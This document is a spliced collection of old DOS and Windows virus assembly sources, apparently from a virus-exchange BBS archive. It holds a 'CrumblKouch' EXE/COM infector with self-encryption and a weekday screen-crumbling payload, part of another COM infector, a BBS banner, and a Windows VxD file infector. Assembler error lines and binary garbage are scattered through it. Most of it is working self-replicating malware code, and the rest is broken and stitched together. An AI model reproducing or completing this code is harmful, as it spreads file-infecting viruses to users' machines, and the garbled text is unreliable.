È€›êêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêêê    ; to ES:BX
          mov  word ptr [bp+oldint24],bx; Save it
          mov  word ptr [bp+oldint24+2],es
          mov  ah,25h                   ; Set new int 24 handler
          lea  dx,[bp+offset int24]     ; DS:DX->new handler
          int  21h
          push cs                       ; Restore ES
          pop  es                       ; 'cuz it was changed

dir_scan:                               ; "dot dot" traversal
          lea  dx,[bp+exe_mask]
          call infect_mask
          lea  dx,[bp+com_mask]
          call infect_mask
          mov  ah,3bh                   ; change directory
          lea  dx,[bp+dot_dot]          ; "cd .."
          int  21h
          jnc  dir_scan                 ; go back for mo!

done_infections:
          mov  ah,2ah                   ; Get current date
          int  21h
          cmp  al,5                     ; Check date of week
          jz   activate

exit_virus:
          mov  ax,2524h                 ; Restore int 24 handler
          lds  dx,[bp+offset oldint24]  ; to original
          int  21h
          push cs
          pop  ds

          mov  ah,3bh                   ; change directory
          lea  dx,[bp+origdir-1]        ; original directory
          int  21h

          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          cmp  sp,id-4                  ; EXE or COM?
          jz   returnEXE
returnCOM:
          int  21h
          retn                          ; 100h is on stack
~         ^
#ERROR 01: Unknown Mnemonic                                               @@@@#
returnEXE:
          pop  es
          pop  ds
          int  21h
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+jmpsave+2],ax
          add  ax,word ptr cs:[bp+stacksave+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+stacksave]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
jmpsave             dd ?                ; Original CS:IP
stacksave           dd ?                ; Original SS:SP
jmpsave2            db ?                ; Actually four bytes
save3               db 0cdh,20h,0       ; First 3 bytes of COM file
stacksave2          dd ?

activate:                               ; Conditions satisfied



                                   ;First, get current video mode and page.
          mov  cx,0B800h      ;color display, color video mem for page 1
          mov  ah,15          ;Get current video mode
          int  10h
          cmp  al,2           ;Color?
          je   A2             ;Yes
          cmp  al,3           ;Color?
          je   A2             ;Yes
          cmp  al,7           ;Mono?
          je   A1             ;Yes
          int  20h            ;No,quit

                                 ;here if 80 col text mode; put video segment in ds.
A1:       mov  cx,0A300h      ;Set for mono; mono videomem for page 1
A2:       mov  bl,0           ;bx=page offset
          add  cx,bx          ;Video segment
          mov  ds,cx          ;in ds

                            ;start dropsy effect
          xor  bx,bx          ;Start at top left corner
A3:       push bx             ;Save row start on stack
          mov  bp,80          ;Reset column counter
                              ;Do next column in a row.
A4:       mov  si,bx          ;Set row top in si
          mov  ax,[si]        ;Get char & attr from screen
          cmp  al,20h         ;Is it a blank?
          je   A7             ;Yes, skip it
          mov  dx,ax          ;No, save it in dx
          mov  al,20h         ;Make it a space
          mov  [si],ax        ;and put on screen
          add  si,160         ;Set for next row
          mov  di,cs:Row      ;Get rows remaining
A5:       mov  ax,[si]        ;Get the char & attr from screen
          mov  [si],dx        ;Put top row char & attr there
A6:       call Vert           ;Wait for 2 vert retraces
          mov  [si],ax        ;Put original char & attr back
                              ;Do next row, this column.
          add  si,160          ;Next row
          dec  di              ;Done all rows remaining?
          jne  A5              ;No, do next one
          mov  [si-160],dx     ;Put char & attr on line 25 as junk
                               ;Do next column on this row.
A7:       add  bx,2            ;Next column, same row
          dec  bp              ;Dec column counter; done?
          jne  A4              ;No, do this column
;Do next row.
A8:       pop  bx              ;Get current row start
          add  bx,160          ;Next row
          dec  cs:Row          ;All rows done?
          jne  A3              ;No
A9:       mov  ax,4C00h  
          int  21h             ;Yes, quit to DOS with error code

                                   ;routine to deal with snow on CGA screen.
Vert:     push ax
          push dx
          push cx              ;Save all registers used
          mov  cl,2            ;Wait for 2 vert retraces
          mov  dx,3DAh         ;CRT status port
F1:       in   al,dx           ;Read status
          test al,8            ;Vert retrace went hi?
          je   F1              ;No, wait for it
          dec  cl              ;2nd one?
          je   F3              ;Yes, write during blanking time
F2:       in   al,dx           ;No, get status
          test al,8            ;Vert retrace went low?
          jne  F2              ;No, wait for it
          jmp  F1              ;Yes, wait for next hi
F3:       pop  cx
          pop  dx
          pop  ax              ;Restore registers
          ret

Row       dw   24             ;Rows to do initially 

creator             db '[MPC]',0        ; Mass Produced Code Generator
virusname           db '[CrumblKouch]',0
author              db 'Kouch',0

infect_mask:
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   exit_infect_mask         ; No mo files found

          mov  al,0h                    ; Open read only
          call open

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+buffer]           ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          cmp  word ptr [bp+buffer],'ZM'; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA
          cmp  ax,65535-(endheap-decrypt) ; Is it too large?
          ja   find_next

          mov  bx,word ptr [bp+buffer+1]; get jmp location
          add  bx,heap-decrypt+3        ; Adjust for virus size
          cmp  ax,bx
          je   find_next                ; already infected
          jmp  infect_com
checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
          jnz  infect_exe
find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findfirstnext
exit_infect_mask: ret

infect_exe:
          les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
          mov  word ptr [bp+jmpsave2], ax
          mov  word ptr [bp+jmpsave2+2], es

          les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
          mov  word ptr [bp+stacksave2], es
          mov  word ptr [bp+stacksave2+2], ax

          mov  ax, word ptr [bp+buffer + 8] ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax, [bp+offset newDTA+26]; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr [bp+buffer+14h], dx ; New entry point
          mov  word ptr [bp+buffer+16h], ax

          mov  word ptr [bp+buffer+0Eh], ax ; and stack
          mov  word ptr [bp+buffer+10h], id

          pop  dx                       ; get file length
          pop  ax

          add  ax, heap-decrypt         ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr [bp+buffer+4], dx ; new file size
          mov  word ptr [bp+buffer+2], ax

          push cs                       ; restore ES
          pop  es

          push word ptr [bp+buffer+14h] ; needed later
          mov  cx, 1ah
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
          push ax                       ; needed later
finishinfection:
          push cx                       ; Save # bytes to write
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  al,2
          call open

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+buffer]           ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          mov  ax,4202h                 ; Move file pointer
          xor  cx,cx                    ; to end of file
          cwd                           ; xor dx,dx
          int  21h

get_encrypt_value:
          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          or  dx,dx                     ; Check if encryption value = 0
          jz  get_encrypt_value         ; Get another if it is
          mov  [bp+decrypt_value],dx    ; Set new encryption value
          lea  di,[bp+code_store]
          mov  ax,5355h                 ; push bp,push bx
          stosw
          lea  si,[bp+decrypt]          ; Copy encryption function
          mov  cx,startencrypt-decrypt  ; Bytes to move
          push si                       ; Save for later use
          push cx
          rep  movsb

          lea    si,[bp+write]          ; Copy writing function
          mov    cx,endwrite-write      ; Bytes to move
          rep    movsb
          pop    cx
          pop    si
          pop    dx                     ; Entry point of virus
          push   di
          push   si
          push   cx
          rep    movsb                  ; Copy decryption function
          mov    ax,5b5dh               ; pop bx,pop bp
          stosw
          mov    al,0c3h                ; retn
          stosb

          add    dx,offset startencrypt - offset decrypt ; Calculate new
          mov    word ptr [bp+patch_startencrypt+1],dx ; starting offset of
          call   code_store             ; decryption
          pop    cx
          pop    di
          pop    si
          rep    movsb                  ; Restore decryption function

          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov ch,0
          mov cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jnz  mo_infections            ; Not enough
          pop  ax                       ; remove call from stack
          jmp  done_infections
mo_infections: jmp find_next

open:
          mov  ah,3dh
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          xchg ax,bx
          ret

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          ret

write:
          pop  bx                       ; Restore file handle
          pop  bp                       ; Restore relativeness
          mov  ah,40h                   ; Write to file
          lea  dx,[bp+decrypt]          ; Concatenate virus
          mov  cx,heap-decrypt          ; # bytes to write
          int  21h
          push bx
          push bp
endwrite:

int24:                                  ; New int 24h (error) handler
          mov  al,3                     ; Fail call
          iret                          ; Return control

exe_mask            db '*.exe',0
com_mask            db '*.com',0
dot_dot             db '..',0
heap:                                   ; Variables not in code
; The following code is the buffer for the write function
code_store:         db (startencrypt-decrypt)*2+(endwrite-write)+1 dup (?)
oldint24            dd ?                ; Storage for old int 24h handler      
backslash           db ?
origdir             db 64 dup (?)       ; Current directory buffer             
newDTA              db 43 dup (?)       ; Temporary DTA                        
numinfec            db ?                ; Infections this run                  
buffer              db 1ah dup (?)      ; read buffer                          
endheap:                                ; End of virus
end       entry_point
               ; write virus
                int        21h                  

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
; Restore the old file-date.
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

                mov        ah,57h                   ; write date
                mov        al,1
                pop        dx
                pop        cx                       ; restore date
                int        21h                  

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
; Close file.
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

                mov        ah,3Eh                   ; close file
                int        21h                  

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
; Restore the old jump-address. 'VIRUS' stores at address 'conta' the jump
; which was at the beginning of the host-program. This will keep the host-
; program as much executable as possible. After storing the address, it 
; works with the jumpaddress of 'VIRUS'. 'VIRUS' will thus be in the 
; work-memory of the program.
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

                mov        dx,cs:[jmpbuf]           ; restore old jmp
                mov        cs:[conta],dx         
hops:
                nop
                call        use_old                        

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
; Continue the execution of the host-program.
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹


cont            db          0e9h
conta           dw          0
                mov         ah,00
                int         21h

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
; Activate the diskdrive choosen at the entry of the program.
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

use_old:
                mov        ah,0eh                   ; use old drive
                mov        dl,cs:drive
                int        21h                        
    
;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
; Activate the path choosen at the entry of the program.
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

                mov        ah,3Bh                   ; use old dir
                lea        dx,cs:[1FDh]             ; get old path and 
                                                    ; backslash
                int        21h                      
                ret

  
search_order    db        0FFh,1,0,2,3,0FFh,0,0FFh
pointer         dw        0000
counter         dw        0000
disks           db        0
mask_com        db        "*.com",00                ; search for com-files
mask_dir        db        "*",00                    ; search for dirs
mask_exe        db        0FFh, 0, 0, 0, 0, 0, 3Fh
                db        0,"????????exe",0,0,0,0
                db        0,"????????com",0
mask_all        db        0FFh, 0, 0, 0, 0, 0, 3Fh
                db        0,"???????????",0,0,0,0
                db        0,"????????com",0

;; mask_all is never used by the code and easilly can be ommited
;; to shorten the code

buffer          equ       0e000h                    ; a save place
~                               ^
#ERROR 16: Definition Conflicts With Forward Reference                    @@@@#
buflen          equ       230h                      ; length of virus

;; At this place I disagree with Ralf. The actual length of the virus
;; is 21Dh bytes when compiled in MASM and 219h bytes when compiled
;; in A86. Because it was Ralf's intention to compile this in MASM
;; 21Dh should be the original length.

jmpbuf          equ       buffer+buflen             ; a save place for jmp
~                                      ^
#ERROR 16: Definition Conflicts With Forward Reference                    @@@@#
path            db        "\",0                     ; first path
drive           db        0                         ; actual drive
back_slash      db        "\"

;; This variable is never used in the code and easilly can be ommited
;; to shorten the code.

old_path        db        32 dup (?)                ; old path
  
code            ends
  
                end        main
tion

;*****************************************************************************;
;                                                                             ;
; The End                                                                     ;
;                                                                             ;
;*****************************************************************************;

code ends

end Encrypt

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]   CoSysOp: Northstar Ken   [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ> and Remember Don't Forget to Call <ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ;
;ƒƒƒƒƒƒƒƒƒƒƒƒ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ƒƒƒƒƒƒƒƒƒƒ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ;

i
~			   	   ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

; *************************************
; * UniToBCSPath                      *
; *************************************
; * This Service Converts             *
; * a Canonicalized Unicode Pathname  *
; * to a Normal Pathname in the       *
; * Specified BCS Character Set.      *
; *************************************

CallUniToBCSPath:
			push	00000000h
			push	FileNameBufferSize
			mov	ebx, [ebx+10h]
~			   	              ^
#ERROR 21: Bad Single Operand                                             @@@@#
			mov	eax, [ebx+0ch]
~			   	              ^
#ERROR 21: Bad Single Operand                                             @@@@#
			add	eax, 04h
~			   	        ^
#ERROR 40: Conflicting Multiple Definition Not Allowed                    @@@@#
			push	eax
			push	esi
			int	20h	; VXDCall UniToBCSPath
UniToBCSPath		=	$
			dd	00400041h
			add	esp, 04h*04h

; *************************************
; * Is FileName '.EXE' !?             *
; *************************************

			; cmp [esi+eax-04h], '.EXE'
			cmp	[esi+eax-04h], 'EXE.'
~			   	                     ^
#ERROR 50: Reg,Mem Required                                               @@@@#
			pop	esi
~			   	   ^
#ERROR 21: Bad Single Operand                                             @@@@#
			jne	DisableOnBusy

IF	DEBUG
~ 	     ^
#ERROR 42: Bad IF Operand                                                 @@@@#

; *************************************
; * Only for Debug                    *
; *************************************

			; cmp [esi+eax-06h], 'FUCK'
			cmp	[esi+eax-06h], 'KCUF'
~			   	                     ^
#ERROR 50: Reg,Mem Required                                               @@@@#
			jne	DisableOnBusy

ENDIF

; *************************************
; * Is Open Existing File !?          *
; *************************************

			; if ( NotOpenExistingFile )
			; goto DisableOnBusy
			cmp	word ptr [ebx+18h], 01h
			jne	DisableOnBusy

; *************************************
; * Get Attributes of the File        *
; *************************************

			mov	ax, 4300h
			int	20h	; VXDCall IFSMgr_Ring0_FileIO
IFSMgr_Ring0_FileIO	=	$
			dd	00400032h

			jc	DisableOnBusy

			push	ecx

; *************************************
; * Get IFSMgr_Ring0_FileIO Address   *
; *************************************

			mov	edi, dword ptr (IFSMgr_Ring0_FileIO-@7)[esi]
~			   	                                            ^
#ERROR 21: Bad Single Operand                                             @@@@#
			mov	edi, [edi]
~			   	          ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#

; *************************************
; * Is Read-Only File !?              *
; *************************************

			test	cl, 01h
			jz	OpenFile

; *************************************
; * Modify Read-Only File to Write    *
; *************************************

			mov	ax, 4301h
			xor	ecx, ecx
~			   	        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#
			call	edi	; VXDCall IFSMgr_Ring0_FileIO

; *************************************
; * Open File                         *
; *************************************

OpenFile:
			xor	eax, eax
~			   	        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#
			mov	ah, 0d5h
			xor	ecx, ecx
~			   	        ^
#ERROR 45: Is It Byte Or Word?                                            @@@@#
			xor	edx, edx
~			   	        ^
#ERROR 45: Is ItQ∫¶s¸â÷É∆
ø π Û§â÷¥0Õ!< uÈ©¥/Õ!âåD∫_ ÷¥Õ!Vé, ø  ^VÉ∆¨π ÄÚÆπ ¨ÆuÓ‚˙^â|â˜É«âÛÉ∆â˜Î6É| uÈ1V&é, â˜&ãuÉ«¨<;t
< t™ÎÙæ  [âwÄ}ˇ\t∞\™ââﬁÉ∆π Û§âﬁ¥N∫ ÷π Õ!Î¥OÕ!sÎ•ãDu$<tÔÅ|y`ÍwËÉ|y
